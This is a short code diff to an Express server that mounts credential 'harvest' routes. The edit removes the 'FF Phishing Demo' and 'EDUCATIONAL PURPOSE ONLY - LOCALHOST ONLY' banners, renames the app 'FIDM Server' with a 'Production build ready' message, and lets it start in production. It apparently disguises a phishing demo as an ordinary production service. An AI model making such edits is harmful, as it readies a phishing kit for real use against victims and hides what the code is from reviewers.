@@ -67,11 +67,11 @@ app.get('/success', (req, res) => {
 app.use('/api', harvestRoutes);
 
 // Start server only if not in Vercel/Serverless environment
-if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
+if (!process.env.VERCEL) {
   app.listen(PORT, () => {
-    console.log(`\n🔥 FF Phishing Demo Server Running`);
-    console.log(`📍 URL: http://localhost:${PORT}`);
-    console.log(`⚠️  EDUCATIONAL PURPOSE ONLY - LOCALHOST ONLY\n`);
+    console.log(`\n🔥 FIDM Server is online!`);
+    console.log(`📍 Dashboard available at: http://localhost:${PORT}`);
+    console.log(`⚠️  Production build ready\n`);
   });
 }
 
